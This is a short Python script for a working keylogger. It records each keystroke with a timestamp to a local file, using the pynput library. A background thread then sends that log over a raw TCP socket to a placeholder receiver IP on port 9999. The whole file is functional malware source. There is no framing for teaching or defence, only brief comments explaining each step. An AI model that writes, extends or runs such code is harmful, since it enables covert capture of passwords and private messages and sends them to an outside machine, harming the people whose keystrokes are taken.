import socket
import time
from pynput import keyboard
from datetime import datetime
from threading import Thread

#File where the log is saved to
log_file = "keylog.txt"

#IP and port of the receiving machine
HOST = "RECEIVER_IP_ADDRESS"  #Replace with your server IP
PORT = 9999

#Copies the keys with time stamps
def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        log_entry = f"[{timestamp}] {key.char}\n"
    except AttributeError:
        log_entry = f"[{timestamp}] [{key}]\n"
    
    with open(log_file, "a") as f:
        f.write(log_entry)

#Sends the log file to the receiver
def send_file():
    time.sleep(30)  #Waits 30 seconds before sending
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            with open(log_file, "rb") as f:
                s.sendall(f.read())
        print("[+] Log file sent successfully.")
    except Exception as e:
        print(f"[!] Failed to send log file: {e}")

#Sends in the background
Thread(target=send_file).start()

#Starts the keylogger
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press Ctrl+C to stop.")
    listener.join()
